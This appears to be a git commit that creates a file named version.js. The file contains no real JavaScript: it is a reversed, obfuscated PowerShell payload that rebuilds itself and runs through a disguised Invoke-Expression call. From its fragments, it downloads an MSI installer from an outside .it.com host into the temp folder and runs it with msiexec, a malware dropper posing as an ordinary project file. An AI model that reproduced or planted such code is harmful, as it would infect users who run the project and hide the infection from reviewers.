826cceb980518691dfef5069729bbb58c9d608d7
Azkic50 <Azkilohj55@gmail.com>
2025-04-07 17:03:27 -0400

    Create version.js

---
+++ version.js
@@ -0,0 +1,22 @@
+sv  aIq5  ( [ChaR[] ] " ) )63]rAhc[,'ex1'  ecAlPER- 93]rAhc[,)121]rAhc[+211]rAhc[+88]rAhc[( eCaLperc- 43]rAhc[,'MzQ'  ecAlPER-421]rAhc[,'ksv' ecAlPER- )')ypXypXNIOJ-]52,62,4[CEpsmOc:vNeex1 (& ksv '+')93]RaHC[,ypXNMAypX  eCaLPER-'+'421]RaHC[,)601]RaHC[+411]RaHC[+37]RaHC[(eCaLPER-))ypX.i9BX(9BX8ZHPMET:vne9BXlNMA+NMAEC = hNMA+NMAypX,ypXlpeR.)29]rAHcypX,ypXA+NMA{ypX,ypXtaPNM'+'A+NypX,ypX+NMA   
+ypX,ypXdaoNMA+NMAypX,ypXMA+NMA  
+(@NMA+NMA = NMA+NMAaNMA+NMAtaDemos9BX  NMA'+'+NMA
+
+NMAypX,ypXNMAif9BX ypX,ypX[]GnIrTs[,NMA8ZHNMA(ECAlpeR.)63]rAHc[]GnIrTs[,)75]rAHc[+66]rAHc[ypX,ypXi NMA+NMA'+'i9BNMA+NMAX( hcNMA+NMAaNMA+NMAeNMA+NMAroNMA+NM'+'Af  
+NMA+NMA;NMA+NMA)NMA+NMA
+}NMA+NMAlypX,ypX
+{ )htaPeliNMA+NMAf9BX hNMA+NMypX,ypXuO- a.ypX,ypXA+NMAwod9BX  NMA+NMA  NMA+NMA    ypX,ypXAypX,ypX+88]rAHc[((ECAlpeR.)NMA  
+
+}  NMA+NMA
+NMA+NMA} NMA+ypX,ypX'+'1ypX,ypXNMAypX,ypX+NMAPUOYCCHNMA+NMAINypX,ypXNMA NMA'+'+NMA NMA+NMA 
+{NMA+NMA hctac NMAypX,ypXNMA+NMAjbONMA+NMAmotsuCSP[NypX,ypXAypX,ypX@]tNMA+NMAceypX,ypXlnNMypX,ypXtaP-tseT(NMA+NMA N'+'MA+NMAfNMA+NMAi    NM'+'A+NMA NMA+NMA 
+;eNMA+NMypX,ypX(ypX,ypX]rAHc[+96]rAHc[+76]rAHc[((ECAypX,ypXNMAypX,ypX+NMA NMA+NMA   NMA+NMA 
+NMA+NMA{ )dNMA+NMAaolnwod9BX( fi NMA+NMA  NMA+NMA ypX,ypXNMA+NMA}    
+;hNMA+NMAtaPNMA+NMAelNMA+NMAiNMA+NMAf9BXNMA+NMA ssNMA+NMAeypX,ypXi9BNMA+NMAXNMA+NMA NMA+NMAi'+'rNMA+NMAU- dNMA+'+'NMAo'+'NMA+NMAh'+'teNMA+NMAMtsNMA+NMAeNMA+NMAR-'+'ekNMA+NMAovnNMA+NMAI   ypX,ypXcorP-tNMA+NMAratS      
+}    NMA+NMA  
+NMA+NMA ;hy'+'pX,ypX  NMA+NMA
+ }     NMA+NMA NMA+NMA
+;eslNMA+NMAaNMA+NMAf9BX =NMA+NMA ypX,ypX(&jrI)43]r'+'AHc[]GnIrTs[,)80ypX,ypXurt9BX'+' = dNMA+NMAypX,ypX;lNMA+NMAENMA+NMACy'+'pX,ypXaolnwod9BX NMA+NMA'+'     
+;NMA+NMAlECNMA+NMA)bNMA+N'+'MAyp'+'X,ypXtNMA+NMAaPNMA+NMAeNMA+NMAlNMA+y'+'pX,ypXECismNMA+N'+'MA.1ypX,ypX'+'Amos9NMA+NMABNMA+NMAX nypX,yp'+'X)NMANMAniOj-]2,11,3[EmAN.)NMA*rdm*NMA '+'ELbAIrAV('+'ypX'+',ypXMAelNMA+NMAif9BX eliFtypX,y'+'pX     
+{N'+'MA+NMA yrNMA+NMAt   NMA+NMA 
+{ )atNMA+NMAaDeNMA+NMypX,ypXi'+'NMA+NMAsm.PUNMA+NMAOYCNMA+NMACHI/moc'+'.ti.kruNMA+NMAkucNMA+NMAal//:sptthlEC = NMA+NMAaNMypX,ypXMA+NMAlEC = b '+'NMA+NMAypX'+' f- MzQ}4{}11{}82{}81{}24{}53{}92{}52{}93{}51{}31{}04{}3{}23{'+'}41{}72{}6'+'1{}21{}83{}12{'+'}13{}33{}03{}02{}32{'+'}01{'+'}8{}34{}7{}63{}2{}5{}43{}6{}71{}62{'+'}0{}9{}1{}14{}22{}42{}73{}91{MzQ((( '(( ()'x'+]03[EmoHsp$+]4[emoHSp$ ( . "  ) ; [ArRAY]::REvERse( $Aiq5) ;$Aiq5 -JOiN'' |. ((gV '*MDR*').nAMe[3,11,2]-jOIn'')
